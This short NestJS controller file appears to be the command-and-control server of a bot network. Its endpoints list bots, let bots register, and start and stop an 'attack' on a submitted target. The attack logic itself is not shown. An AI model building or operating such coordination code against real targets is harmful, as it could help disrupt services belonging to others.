import { Body, Controller, Delete, Get, Post } from '@nestjs/common';
import { ControlService } from './control.service';
import { AttackInfo } from './models/attack-info';
import { BotInfo } from './models/bot-info';

@Controller('control')
export class ControlController {
    constructor(private controlService: ControlService) {}

    @Get()
    getBots() {
        return this.controlService.bots;
    }

    @Post('register')
    updateBot(@Body() botInfo: BotInfo) {
        return this.controlService.updateBot(botInfo.botUrl, botInfo.loop, botInfo.success, botInfo.error);
    }

    @Post('attack')
    attack(@Body() target: AttackInfo) {
        this.controlService.attack(target);
    }

    @Delete('attack')
    stop() {
        this.controlService.stop();
    }
}
